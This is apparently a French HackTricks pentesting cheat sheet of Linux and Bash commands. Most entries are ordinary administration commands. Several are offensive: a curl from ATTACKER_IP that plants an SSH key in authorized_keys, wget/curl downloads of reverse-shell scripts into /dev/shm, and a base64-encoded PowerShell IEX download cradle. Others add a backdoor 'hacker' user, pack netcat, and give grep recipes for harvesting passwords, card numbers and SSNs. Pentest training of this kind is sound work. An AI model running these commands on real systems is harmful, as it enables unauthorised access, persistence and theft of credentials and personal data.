# Commandes utiles de Linux

![](<../../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Bash commun
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker  

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash pour Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
 
#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853  
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Les commandes `grep` sont très utiles pour rechercher des chaînes de caractères dans des fichiers. Voici quelques exemples d'utilisation :

- `grep "motif" fichier` : recherche le motif dans le fichier.
- `grep -r "motif" dossier` : recherche le motif dans tous les fichiers du dossier (et de ses sous-dossiers).
- `grep -i "motif" fichier` : recherche le motif dans le fichier, sans tenir compte de la casse.
- `grep -v "motif" fichier` : affiche toutes les lignes qui ne contiennent pas le motif.
- `grep -E "motif1|motif2" fichier` : recherche soit le motif1, soit le motif2 dans le fichier (utilisation des expressions régulières).
- `grep -n "motif" fichier` : affiche le numéro de ligne de chaque occurrence du motif dans le fichier.
- `grep -c "motif" fichier` : affiche le nombre de lignes contenant le motif dans le fichier.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Aide à la recherche Nmap
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

## Description
Bash est un shell Unix populaire et largement utilisé. Il est également le shell par défaut sur la plupart des distributions Linux.

## Commandes utiles

### Navigation

- `cd [directory]`: Change le répertoire courant en `directory`.
- `pwd`: Affiche le chemin absolu du répertoire courant.
- `ls`: Liste les fichiers et répertoires dans le répertoire courant.
- `ls -l`: Liste les fichiers et répertoires dans le répertoire courant avec des informations détaillées.
- `ls -a`: Liste les fichiers et répertoires dans le répertoire courant, y compris les fichiers cachés.
- `ls -la`: Liste les fichiers et répertoires dans le répertoire courant avec des informations détaillées, y compris les fichiers cachés.

### Manipulation de fichiers

- `touch [filename]`: Crée un nouveau fichier avec le nom `filename`.
- `cat [filename]`: Affiche le contenu du fichier `filename`.
- `nano [filename]`: Ouvre le fichier `filename` dans l'éditeur de texte Nano.
- `vi [filename]`: Ouvre le fichier `filename` dans l'éditeur de texte Vi.
- `cp [source] [destination]`: Copie le fichier `source` vers `destination`.
- `mv [source] [destination]`: Déplace le fichier `source` vers `destination`.
- `rm [filename]`: Supprime le fichier `filename`.
- `mkdir [directory]`: Crée un nouveau répertoire avec le nom `directory`.
- `rmdir [directory]`: Supprime le répertoire vide `directory`.

### Gestion des processus

- `ps`: Affiche les processus en cours d'exécution.
- `ps -ef`: Affiche tous les processus en cours d'exécution avec des informations détaillées.
- `kill [process_id]`: Tue le processus avec l'ID `process_id`.
- `killall [process_name]`: Tue tous les processus avec le nom `process_name`.

### Gestion des utilisateurs

- `whoami`: Affiche le nom d'utilisateur actuel.
- `useradd [username]`: Crée un nouvel utilisateur avec le nom `username`.
- `userdel [username]`: Supprime l'utilisateur `username`.
- `passwd [username]`: Change le mot de passe de l'utilisateur `username`.

### Réseau

- `ping [host]`: Envoie une requête ICMP à `host`.
- `wget [url]`: Télécharge le fichier à partir de `url`.
- `curl [url]`: Affiche le contenu de `url`.
- `ifconfig`: Affiche les informations de configuration réseau.

### Autres

- `history`: Affiche l'historique des commandes précédemment exécutées.
- `sudo [command]`: Exécute la commande `command` avec des privilèges d'administrateur.
- `chmod [permissions] [filename]`: Modifie les permissions du fichier `filename` en `permissions`.
```bash
#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
```
## Iptables

Iptables est un pare-feu de paquets pour Linux. Il permet de filtrer les paquets en fonction de divers critères tels que l'adresse IP source, l'adresse IP de destination, le port source, le port de destination, etc. Iptables est une commande très puissante et complexe, mais elle peut être très utile pour sécuriser votre système Linux.

### Syntaxe de base

La syntaxe de base d'Iptables est la suivante :

```bash
iptables -A <chaîne> -p <protocole> --dport <port> -j <action>
```

- `<chaîne>` : la chaîne à laquelle ajouter la règle (INPUT, OUTPUT, FORWARD)
- `<protocole>` : le protocole à filtrer (TCP, UDP, ICMP, etc.)
- `<port>` : le port à filtrer
- `<action>` : l'action à effectuer si la règle est vérifiée (ACCEPT, DROP, REJECT, etc.)

### Exemples

- Bloquer tout le trafic entrant :

```bash
iptables -P INPUT DROP
```

- Autoriser tout le trafic sortant :

```bash
iptables -P OUTPUT ACCEPT
```

- Autoriser le trafic entrant sur le port 22 (SSH) :

```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

- Autoriser le trafic entrant sur le port 80 (HTTP) :

```bash
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```

- Autoriser le trafic entrant sur le port 443 (HTTPS) :

```bash
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

- Autoriser le trafic entrant provenant d'une adresse IP spécifique :

```bash
iptables -A INPUT -s <adresse_IP> -j ACCEPT
```

- Autoriser le trafic sortant vers une adresse IP spécifique :

```bash
iptables -A OUTPUT -d <adresse_IP> -j ACCEPT
```

- Voir les règles actuelles :

```bash
iptables -L
```

- Supprimer une règle :

```bash
iptables -D <chaîne> <numéro_de_règle>
```
```bash
#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
